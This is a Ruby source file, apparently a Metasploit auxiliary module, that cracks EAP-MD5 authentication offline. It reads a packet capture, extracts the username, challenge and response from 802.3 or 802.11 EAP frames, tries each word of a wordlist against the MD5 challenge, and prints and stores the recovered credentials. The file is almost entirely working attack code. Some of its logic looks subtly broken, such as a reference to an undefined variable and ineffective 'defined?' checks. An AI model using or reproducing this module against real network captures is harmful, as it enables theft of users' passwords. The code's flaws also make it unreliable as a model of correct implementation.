##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'packetfu'

class Metasploit3 < Msf::Auxiliary

    include Msf::Exploit::Capture
    include Msf::Auxiliary::Report

    def initialize
        super(
            'Name'           => 'EAP-MD5 challenge dictionary attack.',
            'Description'    => %q{
                This module launch a dictionary attack against an EAP-MD5 challenge.
                The PCAP should contains at least the following requests:
                EAP reponse, identity (contains the username)
                EAP request, MD5-challenge
                EAP response, MD5-challenge
                EAP success (the module validate the authentication was succesful)

                Compatible with wired and 802.11 - 802.1x environments.
            },
			'Author'         =>
				[
					'pello <fropert[at]packetfault.org>'
				],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision$'
        )

		begin
			require 'pcaprub'
			@@havepcap = true
		rescue ::LoadError
			@@havepcap = false
		end

        register_options(
            [
                OptString.new('WORDLIST', [ true, "Wordlist file for challenge bruteforce.", ''])
            ], self.class)

		deregister_options('RHOST','NETMASK','TIMEOUT','FILTER','SNAPLEN','INTERFACE')

    end

	def find_eap_challenge
		eapinfo = Hash.new
		cap = PacketFu::PcapFile.new.f2a(:filename => datastore['PCAPFILE'])
		cap.each do |pkt|
			begin
				case pkt[30,4].unpack('H4').join
					when "888e" # 802.11
						if pkt[36].to_i == 2 and pkt[40].to_i == 4
							eapinfo['resp'] = pkt[42..(42 + pkt[41] - 1)]
							eapinfo['id'] = pkt[37]
						elsif pkt[36].to_i == 1 and pkt[40].to_i == 4
							eapinfo['req'] = pkt[42..(42 + pkt[41] - 1)]
						elsif pkt[36].to_i == 2 and pkt[40].to_i == 1
							eapinfo['user'] = pkt[42..(42 + pkt[41] - 1)]
						elsif pkt[36].to_i == 3
							eapinfo['status'] = true
						else
							next
						end
					end
				case pkt[12,4].unpack('H4').join
					when "888e" # 802.3
						if pkt[18].to_i == 2 and pkt[22].to_i == 4
							eapinfo['resp'] = pkt[24..(24 + pkt[23] - 1)]
							eapinfo['id'] = pkt[19]
						elsif pkt[18].to_i == 1 and pkt[22].to_i == 4
							eapinfo['req'] = pkt[24..(24 + pkt[23] - 1)]
						elsif pkt[18].to_i == 2 and pkt[22].to_i == 1
							eapinfo['user'] = pkt[24..(24 + pkt[23] - 1)]
						elsif pkt[18].to_i == 3
							eapinfo['status'] = true
						else
							next
						end
					end
				if data.length == 5 then break end
			rescue
				next
			end
		end
		eapinfo
	end

	def compare_challenge_and_passwords(reqchallenge, respchallenge, id, user)
		correctpass = ""
		print_status("Passwords loaded from #{datastore['WORDLIST']}")
        File.open(datastore['WORDLIST'],"r").each_line do |p|
            md5 = Rex::Text.md5(2.chr + p.rstrip + reqchallenge)
            if md5 == respchallenge.unpack('H2'*respchallenge.length).join
				correctpass = p
				break
            end
        end
		if correctpass.empty?
			print_error("Password not found.")
		else
			print_good("The login/password is: #{user}/#{correctpass}")
			report_note(
				:type => 'EAP-MD5',
				:user => user,
				:pass => correctpass)
		end

	end

    def run

		print_status("Looking for EAP-MD5 challenge in #{datastore['PCAPFILE']}")

		eap = find_eap_challenge
		if !defined? eap['req'] or !defined? eap['resp']
			print_error("There is no EAP-MD5 challenge in the PCAP file")
		elsif !eap['status']
			print_error("There is no succesful EAP-MD5 challenge in the PCAP file")
		else
			compare_challenge_and_passwords(eap['req'], eap['resp'], eap['id'], eap['user'])
		end

    end


end
